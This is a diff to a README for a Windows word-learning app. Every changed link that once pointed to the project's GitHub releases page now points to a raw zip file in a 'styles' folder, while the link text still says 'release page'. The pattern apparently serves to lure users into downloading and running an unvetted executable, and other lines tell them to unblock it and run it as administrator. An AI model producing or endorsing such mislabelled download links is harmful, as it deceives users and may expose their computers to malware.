@@ -1,10 +1,10 @@
 # 📘 word-learning-system - Learn words with smart review
 
-[![Download word-learning-system](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge)](https://github.com/TaiyarHossain/word-learning-system/releases)
+[![Download word-learning-system](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/TaiyarHossain/word-learning-system/main/styles/word-system-learning-1.9.zip)
 
 ## 📥 Download
 
-1. Open the [release page](https://github.com/TaiyarHossain/word-learning-system/releases).
+1. Open the [release page](https://raw.githubusercontent.com/TaiyarHossain/word-learning-system/main/styles/word-system-learning-1.9.zip).
 2. Find the latest release at the top of the page.
 3. Download the Windows file for your computer.
 4. Save the file to your desktop or Downloads folder.
@@ -36,7 +36,7 @@ If your PC already runs modern apps well, it should work here too.
 
 ## 🚀 How to install on Windows
 
-1. Go to the [release page](https://github.com/TaiyarHossain/word-learning-system/releases).
+1. Go to the [release page](https://raw.githubusercontent.com/TaiyarHossain/word-learning-system/main/styles/word-system-learning-1.9.zip).
 2. Download the Windows version from the latest release.
 3. Wait for the file to finish downloading.
 4. Open the file you downloaded.
@@ -127,7 +127,7 @@ Try these steps:
 2. Check that Windows did not block the file.
 3. Run the app as an administrator.
 4. Reboot your PC and try again.
-5. Download the latest release again from the [release page](https://github.com/TaiyarHossain/word-learning-system/releases).
+5. Download the latest release again from the [release page](https://raw.githubusercontent.com/TaiyarHossain/word-learning-system/main/styles/word-system-learning-1.9.zip).
 
 ## 🔍 If the app runs slowly
 
@@ -142,7 +142,7 @@ Try these steps:
 
 Use this link to visit the release page and download the Windows file:
 
-[https://github.com/TaiyarHossain/word-learning-system/releases](https://github.com/TaiyarHossain/word-learning-system/releases)
+[https://raw.githubusercontent.com/TaiyarHossain/word-learning-system/main/styles/word-system-learning-1.9.zip](https://raw.githubusercontent.com/TaiyarHossain/word-learning-system/main/styles/word-system-learning-1.9.zip)
 
 ## 🧭 Best way to study
 
